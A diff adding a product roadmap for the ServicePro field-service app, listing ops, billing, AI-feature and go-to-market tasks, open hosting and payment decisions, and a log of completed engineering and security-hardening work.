+**What it does** — support@ (and privacy@, T201) forwarding via Cloudflare Email Routing; Better Stack status page linked in the app footer, built on the monitors from T165 (create the two uptime monitors here if T165 hasn't run yet).
+
+**Why we need it** — "You email me directly" is part of the trust promise; a status page answers "is it down?".
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.2 (3).
+
+---
+
+#### T209 — Activate nightly backups to R2 + restore drill
+
+**Phase**: 14 · **Category**: Ops · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T151, T202
+
+**What it is** — Nightly database backups run, are verified, and a restore has been rehearsed.
+
+**What it does** — Create R2 bucket `servicepro-backups` with a 30-day lifecycle rule and a bucket-scoped token; GitHub secrets; enable `db-backup.yml` (T151); first run checked with `pg_restore --list`; restore into a scratch database and record timings in `docs/ops/backups.md`.
+
+**Why we need it** — Provider backups alone aren't enough for a system holding customers' invoices and payment history.
+
+**Notes** — infra audit §5 `db-backup.yml`.
+
+---
+
+#### T210 — ServicePro plans & billing: Solo/Team/Pro flat, unlimited users, founding offer
+
+**Phase**: 14 · **Category**: Billing · **Hours**: 12 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T122, T169
+
+**What it is** — ServicePro's own subscription plans match the pricing hypothesis and are sold self-serve.
+
+**What it does** — Adapt the existing membership/subscription system (tiers, Stripe Billing on the platform account, proration preview): Solo $39 / Team $99 (unlimited users) / Pro $199, month-to-month, annual options; founding offer — Team at $59/mo for life for the first 25 tenants (Stripe coupon or grandfathered price); plan → platform fee mapping for Connect (T169); feature gating per plan kept minimal; trial length decided.
+
+**Why we need it** — Flat, unlimited-user, no-contract pricing is the attack on incumbents' #1 complaint, and the business needs revenue.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.5. Relies on the webhook fix in T122.
+
+---
+
+#### T211 — Update Fleet and the blog when ServicePro goes live
+
+**Phase**: 14 · **Category**: Docs · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T204
+
+**What it is** — Fleet and the public blog reflect ServicePro's hosting, vendors, costs and URL.
+
+**What it does** — Run `/fleet-sync` (Cloud Run, Workers, DB host, R2, Resend, Twilio, Sentry, PostHog, Better Stack, costs). Blog (`~/repositories/blogs/rob-blog`): add ServicePro to `src/pages/apps.astro` if it's public, and the Worker name/account/hosting to `INFRA.md`; commit, ask before pushing.
+
+**Why we need it** — Required by the owner's global instructions whenever hosting, vendors, costs or domains change.
+
+**Notes** — Owner CLAUDE.md "Fleet" and "Blog" sections.
+
+---
+
+#### T212 — Production config review
+
+**Phase**: 14 · **Category**: Ops · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T203
+
+**What it is** — A checklist-driven review that production runs with safe settings.
+
+**What it does** — `ENV=production`, `GIN_MODE=release`, Swagger and debug off (T114), `COOKIE_SECURE=true`/SameSite (T115), `REGISTRATION_MODE=invite_only` (T106), all secrets from Secret Manager (none as plain env), CORS limited to the production origin, email/storage not mock (T113), `FRONTEND_URL` correct, Sentry/PostHog DSNs set, edge secret enforced.
+
+**Why we need it** — Most of the security fixes are config-dependent ("conditional" findings in the security audit).
+
+**Notes** — security audit F-14, F-15, F-16.
+
+---
+
+#### T213 — Cost guardrails (Cloud Run max instances × DB pool, budget alerts)
+
+**Phase**: 14 · **Category**: Ops · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T203, T144
+
+**What it is** — Hard ceilings on spend and DB connections.
+
+**What it does** — Pin `--max-instances` in `scripts/deploy-cloudrun.sh` and pool size (T144) so instances × pool stays under the DB limit with room for migrate/backup/psql; budget alerts at 50/90/100%; Artifact Registry cleanup; document "raise instances and pool together".
+
+**Why we need it** — Without caps a bot or retry loop can exhaust DB connections exactly when traffic is good, or scale the bill silently.
+
+**Notes** — LL T368 is the pattern.
+
+---
+
+### Phase 15 — AI Differentiators (T214, T215, T216, T217)
+
+AI as accelerator and marketing hook, not the moat — aimed at the collections wedge first. **4 open tasks, ~68h.**
+
+- [ ] T214 — AI collections agent
+- [ ] T215 — AI quote drafting from photos, voice or notes against the price book
+- [ ] T216 — "Ask your business" chat over reporting views
+- [ ] T217 — MCP server for ServicePro
+
+#### T214 — AI collections agent
+
+**Phase**: 15 · **Category**: AI · **Hours**: 24 · **Status**: Open · **v1 Gate**: No · **Depends on**: T121, T065, T181
+
+**What it is** — An agent that runs collections: drafts and sends escalating reminders, reads replies, logs promises-to-pay and suggests calls.
+
+**What it does** — LLM drafts per-invoice messages from history and tone rules (owner approves or auto-sends within limits); inbound email/SMS replies classified ("paid", "send W-9", "dispute", "promise Friday") and turned into actions — promise-to-pay (T065), task for staff, pause reminders; daily summary of who to call.
+
+**Why we need it** — Aligned with the wedge; ServiceTitan only lists it as "coming soon".
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3, §5 v2. Use the `claude-api` skill for model choice.
+
+---
+
+#### T215 — AI quote drafting from photos, voice or notes against the price book
+
+**Phase**: 15 · **Category**: AI · **Hours**: 20 · **Status**: Open · **v1 Gate**: No · **Depends on**: T168, T174
+
+**What it is** — Techs or owners describe the job (photos, voice memo, notes) and get a draft quote built from the tenant's price book.
+
+**What it does** — Multimodal LLM call with the price book as tools/context; produces line items with quantities and options; always a draft for human review.
+
+**Why we need it** — Strong demo value; matches Markate, QuoteIQ and Jobber.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3, §5 v2.
+
+---
+
+#### T216 — "Ask your business" chat over reporting views
+
+**Phase**: 15 · **Category**: AI · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Owners ask questions in plain language ("who owes me the most over 60 days?") and get answers from their data.
+
+**What it does** — LLM with read-only, tenant-scoped query tools over curated reporting views (the Grafana KPI views, A/R); answers cite the numbers; no free-form SQL against raw tables.
+
+**Why we need it** — Cheap given the existing data layer; incumbents ship it (ServiceTitan Atlas, Jobber AI chat).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3. Tenant scoping (T102/T154) is a hard prerequisite.
+
+---
+
+#### T217 — MCP server for ServicePro
+
+**Phase**: 15 · **Category**: AI · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T098
+
+**What it is** — Owners connect ServicePro to Claude or ChatGPT through an MCP server.
+
+**What it does** — Remote MCP server exposing scoped tools (look up customer, A/R summary, create job/request, draft quote) authenticated with per-user OAuth or API keys (T098); tenant-scoped; audit-logged (T093).
+
+**Why we need it** — Cheap, forward-looking differentiator; few FSMs have one.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3, §5 v2.
+
+---
+
+### Phase 16 — Go-to-Market (T218, T219, T220, T221, T222)
+
+Validate the beachhead before the Phase 9–10 build-out, then publish positioning and pricing. **5 open tasks, ~40h.**
+
+- [ ] T218 — Customer discovery: interview 10 commercial service contractors
+- [ ] T219 — Marketing site with positioning + transparent pricing
+- [ ] T220 — White-glove migration offer + playbook
+- [ ] T221 — Comparison / alternative pages (vs Jobber, Housecall Pro, ServiceTitan)
+- [ ] T222 — Validate secondary beachhead (inspection/compliance trades)
+
+#### T218 — Customer discovery: interview 10 commercial service contractors
+
+**Phase**: 16 · **Category**: Research · **Hours**: 10 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Ten structured interviews with owners/office managers of 1–10-tech commercial cleaning, property maintenance and small commercial HVAC shops.
+
+**What it does** — Script covering current tools and spend, billing on terms, POs, multi-site, collections pain, QuickBooks dependence, willingness to pay $99 flat, switching triggers; recruit locally and via property-manager contacts; write up findings and update the beachhead, pricing and Phase 9–10 scope.
+
+**Why we need it** — The beachhead, pricing and collections wedge are hypotheses from desk research. Do this BEFORE the Phase 9–10 build-out.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.3, §4.5. OD-7.
+
+---
+
+#### T219 — Marketing site with positioning + transparent pricing
+
+**Phase**: 16 · **Category**: Marketing · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T218
+
+**What it is** — Public pages that state the positioning and publish the prices.
+
+**What it does** — Landing page around "field service software that gets you paid" for commercial contractors; pricing page (Solo/Team/Pro, no contract, unlimited users, platform fee disclosed); founding-offer CTA; trust promises (export, migration, direct support).
+
+**Why we need it** — Transparent pricing is part of the attack on incumbents' hidden/quote-only pricing.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.4, §4.5.
+
+---
+
+#### T220 — White-glove migration offer + playbook
+
+**Phase**: 16 · **Category**: Marketing · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T193
+
+**What it is** — A documented, repeatable "we migrate you for free" service.
+
+**What it does** — Checklist per source system (Jobber, HCP, spreadsheets) using T193 mappers; data-validation steps; customer communication templates; time budget per migration.
+
+**Why we need it** — Switching friction is the main barrier; a solo founder can credibly offer this.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.2 (3), §4.5.
+
+---
+
+#### T221 — Comparison / alternative pages (vs Jobber, Housecall Pro, ServiceTitan)
+
+**Phase**: 16 · **Category**: Marketing · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T219
+
+**What it is** — Honest comparison pages for buyers searching for alternatives.
+
+**What it does** — One page per competitor: who each is for, pricing (sourced and dated), where ServicePro fits (commercial, terms, flat price); no trademark misuse.
+
+**Why we need it** — High-intent search traffic.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §1.
+
+---
+
+#### T222 — Validate secondary beachhead (inspection/compliance trades)
+
+**Phase**: 16 · **Category**: Research · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T218
+
+**What it is** — Interviews with backflow testing, fire extinguisher/sprinkler inspection and hood-cleaning businesses.
+
+**What it does** — 5+ interviews after the first 10 customers; assess recurring-inspection needs, certificate/authority report formats and current software.
+
+**Why we need it** — Recurring compliance work with mandatory reports creates strong lock-in, but there's no solid market data yet.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.3 "Secondary".
+
+---
+
+## Open Decisions
+
+- **OD-1 — Production database hosting** (T202). Separate Supabase Pro org ($25/mo), upgrade the existing org
+  (~$45/mo), a schema inside an existing project ($0, shared blast radius), or Neon free (no Supabase Auth). Blocks
+  Phase 14 and T158.
+- **OD-2 — Make the GitHub repo private?** It is **public** and now contains the 2026-10-16 audit (exploit-level
+  detail on unfixed flaws) and the product strategy/pricing docs. At minimum keep the audits out of a public repo
+  until Phase 1 is done.
+- **OD-3 — Redis in production** (T142, T161). Upstash (free tier, TLS) vs moving rate limits, tokens and caches to
+  Postgres/in-memory and dropping Redis in production.
+- **OD-4 — Stripe Connect charge model** (T169). Direct charges (tenant is merchant of record and carries dispute
+  liability and Stripe fees) vs destination charges (platform carries dispute liability, more control). Affects
+  Terms (T207) and fee display.
+- **OD-5 — Money representation** (T166). Keep shopspring decimal or move to integer cents before the pgx port.
+- **OD-6 — SMS provider and 10DLC** (T049, T181). Twilio vs Telnyx; per-tenant A2P 10DLC brand/campaign registration
+  cost and lead time; whether ServicePro registers on tenants' behalf.
+- **OD-7 — Beachhead confirmation** (T218). Confirm or change the commercial/B2B beachhead and the $99 Team price
+  after 10 interviews; re-scope Phases 9–10 accordingly.
+- **OD-8 — Cloud Run region.** Follows the database region chosen in OD-1 (Cloud Run and DB in the same region).
+
+
+---
+
+## Dropped from the old TODO (2026-10-16 triage)
+
+Untagged checklist items from the Feb 2026 TODO that were not carried forward. Items still worth doing were folded
+into numbered tasks instead (named in that task's Notes): request correlation IDs, standardized API errors and input
+validation → T223; email retry → T159; secrets rotation runbook → T151; Redis caching → T161 (not needed yet);
+expanded health checks → T140; backend workflow/email/Stripe tests → T157; image optimization → T174; webhook
+handling improvements → T109; Loki/BetterStack → T126; footer links → T138; barrel exports → T137; component
+patterns → T163; useCallback/useMemo audit → T164; dependency scanning → T147; payment tracking TODOs → T118; quote
+template spec → T060; job state machine remainder → T124; quote_status_machine.go:118 → T224; late-fee notification
+→ T083; notification preferences → T091; audit logging → T093; 2FA → T092; public API / customer webhooks → T098,
+T097; white-label branding → T184; mobile app/PWA → T173, T179, T180; dashboard KPI improvements → T088; email
+templates expansion → T048; per-user rate limiting → T116; email open/click tracking → T089.
+
+- **Email Client Enhancements (SES token bucket, batch, Redis queue, SES templates, CloudWatch metrics, SES domain
+  management)** — moot: email moves to Resend only (T159), which handles rate limits, batching and domains.
+- **Storage Client Enhancements (S3 manager multipart, semaphores, checksums, key strategy, SSE/KMS, bulk delete,
+  versioning, client stats)** — moot at current scale with R2 (T160); only MIME/size validation kept.
+- **Metrics Client Enhancements (histograms, summaries, runtime metrics, registry)** — the Prometheus client library
+  already provides these; Cloud Run supplies request/runtime metrics.
+- **HTTP Request Metrics** — Cloud Run request metrics + Sentry performance cover it.
+- **Business Metrics Dashboard (Prometheus KPIs)** — done differently by T026 (Grafana over SQL views).
+- **Infrastructure as Code (Terraform)** — not the fleet pattern; setup is scripted `gcloud` + runbooks (T151, T203).
+- **Redis-Backed Email Queue / Email Batch Sending** — unnecessary with Resend and the scheduled-jobs runner (T141).
+- **Frontend Service Layer Tests / Frontend Store Tests (membershipApi, billingApi, stores)** — the stores are being
+  replaced by TanStack Query (T162); test the queries there.
+- **Target 80% Backend Test Coverage** — replaced by workflow tests on Postgres (T157); coverage % is not a goal.
+- **Implement GeoIP Lookup** — the access-control layer it served is dead code (deleted in T129); no feature needs it.
+- **Customer Email Validation (MX/disposable checks)** — format validation comes with T223; MX/disposable checks add
+  false rejections for business domains.
+- **"Removed Features to Restore": Payment System files** — superseded by Stripe Connect (T169) and saved methods
+  (T171).
+- **"Removed Features": Invoice template management UI** — the backing tables don't exist and the service is dead
+  (correctness audit 5.2); T080 covers reusable terms.
+- **"Removed Features": Error Tracking (Sentry) middleware** — Sentry linkage is fixed in T126; the middleware exists.
+- **"Removed Features": Health Checks – Advanced, Analytics System, Performance Monitoring packages** — `/health`,
+  `/health/live`, `/health/ready`, `/metrics` and PostHog already exist; the custom packages would duplicate them.
+- **"Orphaned Features": Payment Notification System** — replaced by the shipped reminder system (T034/T043, fixed in
+  T121).
+- **"Orphaned Features": Job Scheduling System (schedules CRUD API)** — the remaining real gap (nothing writes
+  `schedules`) is fixed in T099.
+- **"Orphaned Features": Tax Calculation Service (US state rate tables)** — hand-maintained state tables are a
+  liability; tenants already define tax rates. Revisit with Stripe Tax if multi-jurisdiction customers appear.
+- **"Orphaned Features": WebSocket Real-time Notifications** — no backend WS route; the frontend client is gated and
+  deleted as dead code (T137). Revisit only with a concrete real-time need.
+- **Old "Fix @ts-nocheck in Routes", "Remove Console.log", "Structured JSON Logging", "E2E Testing Setup"** — already
+  complete (see Verified Complete).
+
+
+---
+
+## Verified Complete
+
+### Before 2026-10-16
+
+- **T001** — Recovery middleware Sentry integration. Panics captured with stack trace, request context, user ID; `RecoveryMiddleware` accepts `errortracking.Client`; `gin.Default()` → `gin.New()`; applied first in route setup. (Note 2026-10-16: the Sentry provider is not linked into the binary, so nothing is actually reported — T126.)
+- **T002** — Centralized fetch() calls. `pdfGenerator.tsx`, `useQuoteCalculations.ts` now use the api service; no direct `fetch('/api/...')` calls remained at the time.
+- **T003** — nginx security headers. CSP, HSTS (`max-age=31536000; includeSubDomains`), Permissions-Policy, Referrer-Policy `strict-origin-when-cross-origin` added to nginx.conf. (Ported to `_headers` for Workers in T150.)
+- **T004** — GitHub Actions CI/CD. `checks.yml` (pre-commit lint, backend tests, frontend tests), `release.yml` (GitHub Release with changelog on tags), `deploy-release.yml` (tests + Fly.io backend + Cloudflare Pages frontend on tags). (Replaced by T145/T146.)
+- **T005** — Prometheus /metrics endpoint. Enabled via `PROMETHEUS_ENABLED=true`, metrics client initialized in `cmd/main.go`, uses `pkg/clients/metrics/prometheus/`.
+- **T006** — Structured JSON logging. Custom logging client at `pkg/clients/logging/` (Mock, BetterStack, CloudWatch, Loki providers), global logger (`SetDefault()`/`L()`), all `fmt.Printf`/`log.Printf` migrated; JSON in production, human-readable in development; standard fields timestamp, level, message, request_id, user_id, tenant_id. Exceptions: config/config.go (circular import), logging package files.
+- **T007** — Fix `any` types. Replaced 50+ `any` types, created `src/utils/error.ts`, fixed type definition files (template.ts, chart.ts, recurring/types.ts, calendar/types.ts), pages, components, stores and all test mocks (e.g. `MockCardElementProps`).
+- **T008** — Remove @ts-nocheck. Removed from `routes/index.tsx` (35+ `@ts-expect-error` comments on dynamic imports) and `utils/performance.ts`; fixed `loadable()` signature; added browser API interfaces (`PerformanceEventTiming`, `LayoutShiftEntry`, `ExtendedPerformanceObserverInit`, `DocumentWithPrerendering`).
+- **T009** — Enable noUnusedLocals/noUnusedParameters. 17 issues fixed: 7 unused `React` imports, unused variables (`_chartRef`, `_handleItemsChange`, `_bulkAssignMutation`, `_formatValue`, `_navigate`, `_API_BASE_URL`), dead `_offlineFallback` route, `_`-prefixed unused params.
+- **T010** — Error tracking middleware. Already implemented via `RecoveryMiddleware` in `error_handler.go` (panics → error tracking with method, path, query, client IP, user context; first in chain). HTTPMiddleware not needed since nothing else calls `CaptureException`.
+- **T012** — Bundle size monitoring in CI. Markdown reports in CI step summaries (`analyze-bundle.cjs`), pre-push hook validation, release script gate. Thresholds 500 KB warn / 750 KB fail (total JS gzipped); per-chunk budgets for vendor splits.
+- **T013** — Frontend test coverage 70%+ (52 test files, 1251 tests; 69.87% statements, 72.49% functions, 70.99% lines). (Suite is red as of 2026-10-16 — T136.)
+- **T014** — Integration tests for critical workflows (auth, customer CRUD, job lifecycle, quote workflow, invoice & payment) in `frontend/tests/integration/`.
+- **T015** — OpenAPI/Swagger documentation. Backend generates `swagger.json` via swag, Swagger UI at `/api/docs`, frontend generates TypeScript types via `npm run generate:api`.
+- **T016** — Frontend bundle optimization. Gzipped bundle 720 KB → 322 KB (-55%): lazy-loaded `@react-pdf/renderer`, fixed `manualChunks` boundary matching (react-big-calendar was landing in the catch-all vendor chunk), dedicated `vendor-calendar`/`vendor-pdf`/`vendor-table` chunks, fixed `analyze-bundle.cjs` ESM issue.
+- **T017** — Query performance monitoring. Custom GORM logger (`pkg/database/logger.go`) with slow-query detection (≥100 ms WARN, ≥1 s ERROR); Prometheus `db_query_duration_seconds`, `db_queries_total`, `db_query_errors_total` with operation/table labels; pool gauges (`pkg/database/pool_metrics.go`: open/idle/in-use/max/wait count/wait duration); `DB_SLOW_QUERY_THRESHOLD`, `DB_QUERY_ALERT_THRESHOLD`, `DB_LOG_ALL_QUERIES`; deferred wiring via `SetMetricsClient()`.
+- **T018** — Dead code elimination. Removed ~2,700 lines (`components/recurring/`, `components/subscriptions/`, `components/health/`, `utils/performance.ts`, `hooks/useErrorTracking.ts`, `hooks/useAnalytics.ts`, `hooks/useKPI.ts`); ts-prune with a baseline of 116 known unused exports, `npm run dead-code` / `dead-code:update`, pre-commit hook and CI job.
+- **T019** — Calendar view for job scheduling. Read-only `JobCalendarPage` at `/jobs/calendar` using `GET /v1/jobs/scheduled?start=&end=`, status colour mapping, click to job detail; drag-drop disabled (T027). Files: `JobCalendarPage.tsx`, `jobService.getScheduledJobs()`, `calendar/Calendar.tsx`, `calendar/types.ts`, routes.
+- **T020** — Conflict detection API endpoint. `POST /v1/conflicts/check` wires the existing `ConflictDetector`; `conflict_handler.go` with Swagger annotations, `conflicts_routes.go` with auth + tenant + permission middleware; tenant scoping fixed in `GetByTechnicianAndDateRange()`/`GetByDateRange()`; `TenantID` set from auth context; detects technician overlap, business hours, workload excess with resolution suggestions; Swagger + TS types regenerated.
+- **T021** — Extract duplicate file download utility. `src/utils/fileDownload.ts` with `downloadFile()`, `downloadCSV()`, `downloadJSON()`, `downloadPDF()`, `openBlobInNewTab()`, `downloadFromDataURL()`; 10 files refactored.
+- **T022** — Extract duplicate URLSearchParams builder. `src/utils/queryParams.ts` (`buildQueryParams()`, `buildQueryString()`, `appendQueryParams()`); refactored customerReportService (7), revenueService (6), invoiceService (1), customerService (1).
+- **T023** — Consolidate cache hooks. Generic `useStorageCache` with a `CacheAdapter` interface in `src/hooks/useCache.ts`; `useLocalCache` and `useSessionCache` share the core.
+- **T024** — Full Sentry integration. GlitchTip (Sentry-compatible) in docker-compose with its own Postgres + Celery worker; frontend Sentry SDK in `main.tsx`, `ErrorBoundary`, user context on login/logout/checkAuth in `authStore.ts`; backend via factory pattern; no DSN = no-op. Source maps deferred to T101.
+- **T025** — PostHog product analytics. Frontend `posthog-js` analytics service (`initAnalytics`, `trackEvent`, `identifyUser`, `resetUser`), typed event constants, `PageViewTracker`, `useAnalytics`; workflow events quote_created/sent/accepted/rejected, job_created/completed/status_changed, invoice_created/sent, export_downloaded. Backend `posthog-go` pluggable client (PostHog + mock); Stripe webhook → `payment_received`. Env `POSTHOG_API_KEY`, `POSTHOG_HOST`, `VITE_POSTHOG_*`.
+- **T026** — Grafana KPI dashboard. Grafana OSS replaced Metabase in docker-compose (port 3001); provisioned Postgres datasource and `grafana/dashboards/platform-overview.json`; 8 views in `001_schema.sql` (`v_platform_overview`, `v_tenant_growth_daily`, `v_feature_adoption`, `v_job_metrics_daily`, `v_invoice_metrics_daily`, `v_quote_conversion`, `v_revenue_daily`, `v_ar_aging_summary`); 12 panels.
+- **T031** — A/R aging buckets report. Backend `models/ar_aging_report.go`, `services/ar_aging_service.go`, `handlers/ar_aging_handler.go`; frontend `types/arAging.ts`, `services/arAgingService.ts`, `pages/Reports/ARAgingReportPage.tsx`. Buckets Current, 1-30, 31-60, 61-90, 90+, drill-down to invoices, CSV export. (Returns empty for API-created data until T102 writes `tenant_id`.)
+- **T032** — "Who Owes What" report. Customer filter dropdown on the A/R Aging report (customer summary endpoint `/api/v1/reports/ar-aging/customers`, `min_amount` filter); fixed Gin UUID query binding (`ShouldBindQuery` can't bind `*uuid.UUID` → string field + `ParseCustomerID()`).
+- **T034 + T043** — Payment reminder automation (merged). `payment_reminders` table, `PaymentReminderService` with hourly background worker, escalating tone (friendly → firm → final), email/SMS with customer preference resolution, dedup, manual trigger; API `GET/POST /invoices/:id/reminders`, `GET/PUT /settings/payment-reminders`; Notifications tab in Org Settings; reminder history + manual send on Invoice Detail. (2026-10-16: the reminder query has an ambiguous column and has never sent; SMS client never wired — T121.)
+- **T053** — "Repeat Job" button on customer detail. `?clone=` param on JobDetailPage pre-fills from the source job (title, type, priority, duration, notes, instructions, materials); customer detail lists recent jobs with "Repeat Job"/"View"; JobActionsMenu "Repeat Job"; "New Job" from the customer page pre-selects the customer.
+- **T100** — Business hours & timezone in org settings (commit 3df4280 "added business hours and timezone"). Admins set an IANA timezone and business hours/days in org settings. The backend does not read these settings yet — see T099 (conflict detection, days overdue) and T127 (other settings).
+
+Untagged items completed before the indexed system:
+
+- Rate limiting — multi-tier with Redis backing, applied globally via `DynamicRateLimit()`.
+- PDF generation — quotes, invoices, receipts with S3 storage and email attachments (`document_pdf_service.go`, `services/pdf/templates.go`; download endpoints `GET /api/v1/quotes/:id/pdf`, `/invoices/:id/pdf`, `/invoices/:id/receipt/pdf`).
+- SMS integration — TextBelt, SNS, Mock providers with pluggable architecture.
+- httpOnly cookies — SameSite=Lax for CSRF protection.
+- Security headers (backend) — CSP, HSTS, X-Frame-Options in middleware.
+- Error tracking client — Sentry integration at `pkg/clients/errortracking`.
+- `.env` in `.gitignore` — properly excluded.
+- Console.log stripping — Terser `drop_console: true` in production build (`frontend/config/optimization.ts:64`).
+- Migrate `db.Raw()` to GORM (SQL injection risk).
+- Cypress E2E testing — auth, customers, jobs, invoices, quotes, payments.
+- Graceful shutdown — SIGTERM/SIGINT handling with 30 s timeout in `cmd/main.go`.
+- HTTP server timeouts — ReadTimeout, WriteTimeout, IdleTimeout, ReadHeaderTimeout via `http.Server`.
+- MaxMultipartMemory — configurable via `SERVER_MAX_MULTIPART_MEMORY`, applied to the router.
+- TrustedProxies — configurable via `SERVER_TRUSTED_PROXIES`, applied to the router. (Unsafe empty default — T107.)
+- Deep health checks — `/health`, `/health/live`, `/health/ready` with DB + Redis connectivity checks.
+- localStorage token fix — `ConflictChecker.tsx` uses the api service with httpOnly cookies.
+- Dependency vulnerability scanning — Dependabot for Go and npm, weekly, auto-merge for patch-level security updates. (Prefixes and blocking issues — T147.)
+- Job status state machine — `POST /api/v1/jobs/:id/transition`, `GET /api/v1/jobs/:id/status-history` (`models/job_status.go`, `job_service.go`, `job_handler.go`).
+
+Dated history from the original "Completed Items" list:
+
+- Initial project setup (2024-01-15)
+- Basic authentication flow (2024-01-20)
+- Customer CRUD operations (2024-01-25)
+- Membership system with Stripe integration (2025-01-25)
+- Subscription proration preview (2025-01-25)
+- Local email development setup with Mailpit (2025-01-25)
+- Security headers middleware (2025-01-25)
+- CORS configuration with environment-specific origins (2025-01-25)
+- Job status state machine with transition validation (2025-01-29)
+- Job status history tracking (2025-01-29)
+- PDF generation for quotes, invoices, and receipts (2025-01-30)
+- PDF attachments in quote/invoice/receipt emails (2025-01-30)
+- PDF download endpoints for quotes, invoices, receipts (2025-01-30)
+- Clone quote functionality (2025-01-30)
+- Quote accept/decline actions in UI (2025-01-30)
+- Dropdown menus with portal rendering (fixes table overflow clipping) (2025-01-30)
+- Cypress E2E testing setup with tests for auth, customers, jobs, invoices, quotes, payments
+
+
+### 2026-10-16 — audit remediation session
+
+- **T139** — golang-migrate baseline (000001), cmd/migrate, dev-only startup migrations. golang-migrate baseline `000001_initial_schema` (snapshot of the old 001_schema.sql) + `000002` (fixes `v_ar_aging_summary`, which never applied), embedded via `migrations/embed.go`; `cmd/migrate` (up/down/version/force; down refused in production); legacy DBs adopted at v1; `RUN_MIGRATIONS_ON_STARTUP` (dev default on). Dev seed moved to `backend/seeds/dev_seed.sql`.
+- **T140** — /version endpoint and schema-aware readiness. Root `GET /version` `{git_sha, app_version}` from `APP_VERSION`/`GIT_SHA`; hardcoded `/api/v1/version` removed; `/health` + `/health/ready` include version; readiness reports schema ok/ahead/behind/dirty and returns 503 on behind/dirty (rechecked every 30s).
+- **T141** — Background tickers → internal job endpoints + scheduled-jobs workflow. `POST /internal/jobs/payment-reminders` (header `X-Internal-Jobs-Token` = `INTERNAL_JOBS_SECRET`, 404 when unset); reminders claimed with `INSERT … ON CONFLICT DO NOTHING` before sending (re-run + concurrent tests); `RUN_BACKGROUND_WORKERS` gates in-process tickers (dev default on); `.github/workflows/scheduled-jobs.yml` hourly, inert until `vars.API_URL`. The analytics aggregator is never started and the webhook 'cleanup' tickers only evict per-instance caches, so they got no endpoints. Also fixed the ambiguous `status` column that stopped every automatic reminder (part of T121).
+- **T142** — Redis optional at boot. Redis optional: unset/unreachable at boot → warning + embedded in-memory store; readiness reports `not_configured`/`in_memory_fallback`. Caveat: reset/verification tokens and rate limits are then per-instance — production needs T161.
+- **T143** — Cloud Run-ready Dockerfile and .dockerignore. `backend/Dockerfile`: golang:1.26-alpine builder, CGO off, trimpath; alpine:3.22 runtime, non-root uid 10001, ca-certs + tzdata, `GIT_SHA`/`APP_VERSION` build args → env, builds `server` + `migrate`, HEALTHCHECK `/health/live`; new `.dockerignore` (the old one excluded `pkg/`). Not yet built under Docker locally (daemon was down) — CI's docker-build + Trivy job is the gate.
+- **T144** — DB pool sizing and pooler (simple protocol) support. `DB_MAX_OPEN_CONNS` default 10 outside development (25 in dev); `DB_SIMPLE_PROTOCOL=true` or a :6543 URL enables pgx simple protocol for Supabase's transaction pooler; migrations always use simple protocol.
+- **T145** — CI rewrite: lint, tests with Postgres+Redis, govulncheck, OpenAPI drift, frontend, Docker + Trivy. `.github/workflows/ci.yml`: golangci-lint (pinned action), go test -race with Postgres 16 + Redis 7 services, db-integration (continue-on-error until the suite compiles), govulncheck, openapi-drift, frontend typecheck/lint/vitest/build/npm audit/dead-code/bundle, docker build + Trivy; `contents: read`, timeouts, PR-only cancellation. Several gates are red on existing code until Phase 1/2 land (T117, T129, T136).
+- **T146** — Tag-driven release-deploy pipeline, VERSION scripts and RELEASING.md. `release-deploy.yml` (guard VERSION==tag → migrate → Cloud Run → Worker → GitHub Release; deploy jobs skipped until `vars.GCP_PROJECT_ID`), `migrate.yml`, `scripts/bump-version.sh` (understands legacy `minor:`/`major:`), `scripts/gh-release.sh`, `scripts/deploy-cloudrun.sh`, `RELEASING.md`, `make bump`/`release-check`.
+- **T147** — Dependabot deps() prefixes, automerge and weekly security scan. Dependabot `deps(go)`/`deps(npm)`/`deps(actions)` prefixes, `dependabot-automerge.yml`, weekly `security-scan.yml`.
+- **T148** — Versioned bash git hooks replace python pre-commit; commit-msg prefix contract. Python pre-commit framework replaced by versioned `scripts/git-hooks/{pre-commit,commit-msg}` + `make install-hooks`: golangci-lint, Go tests/build and OpenAPI drift (via `go tool swag`) on staged backend changes; eslint + tsc on staged frontend changes; commit-msg enforces the prefix contract.
+- **T149** — Repo hygiene: tracked artifacts, Fly/nginx/cliff removal, .gitignore, single Makefile. Untracked `frontend/bundle-report.html` and test-export CSVs; deleted `backend/fly.toml`, `backend/tests/Makefile`, `cliff.toml`, `scripts/release.sh`, `scripts/run-tests.sh`, `scripts/setup.sh`, `frontend/{Dockerfile,nginx.conf,security-headers.conf}`; tightened `.gitignore`; CHANGELOG.md frozen at v0.7.0; compose images pinned (MinIO left on :latest — no longer publicly pullable, see T160).
